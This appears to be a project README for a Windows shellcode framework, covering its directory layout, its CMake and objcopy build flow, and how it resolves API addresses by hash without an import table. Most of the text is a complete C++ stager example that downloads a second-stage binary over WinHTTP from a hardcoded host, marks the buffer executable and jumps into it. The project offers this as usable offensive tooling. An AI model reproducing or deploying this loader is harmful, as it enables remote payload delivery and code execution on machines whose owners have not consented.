## A Simple and Easy-to-Use Shellcode Framework

### Structure Overview

The `api` directory provides the `get_function_address` and `get_function_address_by_hash` functions for resolving target function addresses. Refer to the function signatures for the required parameters.

This directory also defines the structures and macro helpers required by the framework, extracted from MinGW-related headers. In theory, these structures and macros support both x64 and x86. The x64 path has been verified in practice, while x86 still needs validation.

The `frame` directory provides:

- the CMake helper function used to build shellcode targets
- the framework macro `FRAME_FUNCTION`
- the shellcode entry macro `SHELLCODE_ENTRY`
- the predefined function signature header `function_signature.h`
- the linker script used to control memory layout
- the common macro constants header `frame_constant_macro.h`

The CMake helper quickly builds an `.exe` target and then uses `objcopy` to extract the `.payload` section into exported shellcode. The `FRAME_FUNCTION` macro is used to export functions with a C-compatible calling convention and place the generated code into the `.payload` section.

The `frame_api` directory provides simple implementations of basic functions. At the moment it contains `frame_memcpy` and `frame_memset`, which are functionally equivalent to standard `memcpy` and `memset`.

The `hash` directory provides hash calculation helpers used by `get_function_address` and `get_function_address_by_hash` for dynamic symbol resolution.

### Usage Example

Clone the project locally, then create a `.cpp` file in the project root and define a function that implements your shellcode logic. Mark the entry function with the `SHELLCODE_ENTRY` macro.

After implementing the logic, call the provided CMake helper in `CMakeLists.txt`. Its parameter list is:

`(target_name entry_source_cpp_file)`

Then build the project. CLion is recommended because it usually ships with `objdump` and `objcopy`. After building, the `cmake-build-*` directory will contain both an `.exe` file and a `.bin` file. The `.bin` file is the extracted shellcode, while the `.exe` file is useful for quick validation without additional loader setup.

In the current project configuration, the target is declared as:

`(stager_shellcode shellcode.cpp)`

Example:

```cpp
#include "frame/frame_macro.h"

SHELLCODE_ENTRY void shellcode_entry(void) {
    constexpr char kernel32_dll[] = "kernel32.dll";
    constexpr char load_lib_a[] = "LoadLibraryA";
    constexpr char win_http_dll[] = "winhttp.dll";
    constexpr char win_http_open[] = "WinHttpOpen";
    constexpr char win_http_connect[] = "WinHttpConnect";
    constexpr char win_http_open_request[] = "WinHttpOpenRequest";
    constexpr char win_http_send_request[] = "WinHttpSendRequest";
    constexpr char win_http_receive_response[] = "WinHttpReceiveResponse";
    constexpr char win_http_query_data_available[] = "WinHttpQueryDataAvailable";
    constexpr char win_http_read_data[] = "WinHttpReadData";
    constexpr char win_http_close_handle[] = "WinHttpCloseHandle";
    constexpr char virtual_alloc[] = "VirtualAlloc";
    constexpr char virtual_protect[] = "VirtualProtect";
    constexpr char sleep[] = "Sleep";

    constexpr wchar_t host[] = L"192.168.56.104";
    constexpr wchar_t path[] = L"/stager2.bin";
    constexpr wchar_t user_agent[] = L"User Agent";
    constexpr wchar_t method[] = L"GET";
    constexpr uint16_t port = 8081;
    constexpr bool use_https = false;

    uint8_t* stager2 = nullptr;
    uint32_t stager2_size = 0;

    auto _LoadLibraryA = reinterpret_cast<fn_load_library_a>(
        get_function_address(kernel32_dll, load_lib_a));

    _LoadLibraryA(win_http_dll);

    auto _WinHttpOpen = reinterpret_cast<fn_win_http_open>(
        get_function_address(win_http_dll, win_http_open));
    auto _WinHttpConnect = reinterpret_cast<fn_win_http_connect>(
        get_function_address(win_http_dll, win_http_connect));
    auto _WinHttpOpenRequest = reinterpret_cast<fn_win_http_open_request>(
        get_function_address(win_http_dll, win_http_open_request));
    auto _WinHttpSendRequest = reinterpret_cast<fn_win_http_send_request>(
        get_function_address(win_http_dll, win_http_send_request));
    auto _WinHttpReceiveResponse = reinterpret_cast<fn_win_http_receive_response>(
        get_function_address(win_http_dll, win_http_receive_response));
    auto _WinHttpQueryDataAvailable = reinterpret_cast<fn_win_http_query_data_available>(
        get_function_address(win_http_dll, win_http_query_data_available));
    auto _WinHttpReadData = reinterpret_cast<fn_win_http_read_data>(
        get_function_address(win_http_dll, win_http_read_data));
    auto _WinHttpCloseHandle = reinterpret_cast<fn_win_http_close_handle>(
        get_function_address(win_http_dll, win_http_close_handle));
    auto _VirtualAlloc = reinterpret_cast<fn_virtual_alloc>(
        get_function_address(kernel32_dll, virtual_alloc));
    auto _VirtualProtect = reinterpret_cast<fn_virtual_protect>(
        get_function_address(kernel32_dll, virtual_protect));
    auto _Sleep = reinterpret_cast<fn_sleep>(
        get_function_address(kernel32_dll, sleep));

    void* session = nullptr;
    void* connect = nullptr;
    void* request = nullptr;

    session = _WinHttpOpen(
        user_agent,
        FRAME_WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        nullptr,
        nullptr,
        0);

    if (!session) {
        goto cleanup;
    }

    connect = _WinHttpConnect(
        session,
        host,
        port,
        0);

    if (!connect) {
        goto cleanup;
    }

    request = _WinHttpOpenRequest(
        connect,
        method,
        path,
        nullptr,
        nullptr,
        nullptr,
        use_https ? FRAME_WINHTTP_FLAG_SECURE : 0);

    if (!request) {
        goto cleanup;
    }

    if (!_WinHttpSendRequest(
        request,
        nullptr,
        0,
        nullptr,
        0,
        0,
        0)) {
        goto cleanup;
    }

    if (!_WinHttpReceiveResponse(request, nullptr)) {
        goto cleanup;
    }

    stager2 = static_cast<uint8_t*>(_VirtualAlloc(
        nullptr,
        1024 * 1024 * 30,
        FRAME_MEM_COMMIT | FRAME_MEM_RESERVE,
        FRAME_PAGE_READWRITE));
    frame_memset(stager2, 0, 1024 * 1024 * 30);

    while (true) {
        uint32_t available_bytes = 0;

        if (!_WinHttpQueryDataAvailable(request, &available_bytes)) {
            goto cleanup;
        }

        if (available_bytes == 0) {
            goto cleanup;
        }

        uint32_t read_bytes = 0;

        if (!_WinHttpReadData(
            request,
            stager2 + stager2_size,
            available_bytes,
            &read_bytes)) {
            goto cleanup;
        }

        stager2_size += read_bytes;
    }

cleanup:
    if (session) {
        _WinHttpCloseHandle(session);
    }
    if (connect) {
        _WinHttpCloseHandle(connect);
    }
    if (request) {
        _WinHttpCloseHandle(request);
    }

    if (stager2 && stager2_size > 0) {
        uint32_t old_protected_bytes = 0;
        _VirtualProtect(static_cast<void*>(stager2), stager2_size, FRAME_PAGE_EXECUTE_READ, &old_protected_bytes);
        reinterpret_cast<void(*)()>(stager2)();
        _Sleep(FRAME_INFINITE);
    }
}
```

### Notes

Most shellcode frameworks follow the same general approach: resolve function addresses dynamically, then invoke them through function pointers. This avoids introducing an import table or other PE-level dependencies on process context or loader initialization.

The logic used in this project to locate already loaded DLLs was inspired by the `ShellcodeStdio` project:

https://github.com/jackullrich/ShellcodeStdio
